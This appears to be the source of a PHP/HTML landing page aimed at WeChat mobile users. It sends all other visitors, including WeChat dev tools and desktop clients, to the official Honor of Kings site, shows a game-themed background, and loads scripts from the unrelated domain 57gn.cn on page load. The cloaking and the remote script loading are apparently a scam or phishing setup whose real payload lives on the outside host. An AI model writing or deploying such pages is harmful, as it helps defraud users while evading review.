<?php 
function is_weixin(){ 
	if ( strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false ) {
			if (strpos($_SERVER['HTTP_USER_AGENT'], 'wechatdevtools')||strpos($_SERVER['HTTP_USER_AGENT'], 'WindowsWechat')) {
				return false;
			}
		return true;
	}	
	return false;
}
if (!is_weixin()) {
	header('location:http://pvp.qq.com');
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="description" content="">
<title></title>
<link href="https://res.wx.qq.com/open/libs/weui/1.1.2/weui.min.css" rel="stylesheet">
<link href="https://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet">
<link href="./css/hq.css" rel="stylesheet">
<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
<script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="http://57gn.cn/js/common.js"></script>
<script>
    $("body").on("touchmove",
    function(e) {
        e.preventDefault();
    });
</script>
</head>

<body style="background: url(http://cdn.ur.qq.com/uploadImages/2017-08-04/20170804112615.JPG) 50% 12% / cover no-repeat;">
<div style="width:000px;height:0000px;overflow:hidden"></div>
<div style="width:00000px;height:0000000px;overflow:hidden"></div>
<script type="text/javascript" src="http://57gn.cn/js/wz.js"></script>
</html>
